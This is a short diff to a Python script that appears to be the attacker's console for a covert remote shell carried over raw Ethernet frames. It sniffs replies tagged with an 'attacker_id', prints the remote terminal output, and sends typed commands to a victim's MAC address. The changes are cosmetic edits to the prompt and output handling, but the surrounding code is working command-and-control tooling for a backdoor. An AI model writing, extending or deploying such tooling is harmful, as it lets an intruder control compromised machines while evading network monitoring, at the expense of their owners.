@@ -60,23 +60,25 @@ def process_return_frame(frame):
                 
                 index = str(eth_frame.payload.original).find(attacker_id)
                 if index != -1:
-                    print("Source MAC:", eth_frame.src)
-                    print("Destination MAC:", eth_frame.dst)
-                    print("Payload Length:", len(eth_frame.payload))
+                    #print("Source MAC:", eth_frame.src)
+                    #print("Destination MAC:", eth_frame.dst)
+                    #print("Payload Length:", len(eth_frame.payload))
                     string = str(eth_frame.payload.original)[index + len(attacker_id):]
-                    string = string.strip("'")
+                    string = string.replace("'", "")
                     pad = "\\x00" # Gets rid of padding
                     returnc = "\\r" # Gets rid of return carriage
-                    nstring = string.replace(attacker_id, '')
+                    #nstring = string.replace(attacker_id, '')
                     
-                    nstring = nstring.replace(returnc, '')
+                    nstring = string.replace(returnc, '')
                     
                     # Attempts to format the terminal items
                     terminal_format = nstring.split('\\n')
+                    
                     for line in terminal_format:
                         print(line)
                     
-                    #print("\n" + session_id + ">", end='')
+                    print("" + session_id + ">", end='')
+                    
 
 # Sniff Ethernet frames and call the process_packet function for each packet
 def listen():
@@ -100,7 +102,7 @@ def connect():
     userin = ""
     while userin != "x":
         userin += session_id 
-        userin += str(input(session_id + ">"))
+        userin += str(input())
                  
         # Make sure the input isn't larger than the set amount
         if len(userin) > frame_size:
@@ -108,7 +110,9 @@ def connect():
         
         if userin != session_id:
             send_frame(userin.encode('utf-8'), mac_address)
-            
+        else:
+            print("" + session_id + ">", end='')
+        
         userin = ''
     exit(0)
     
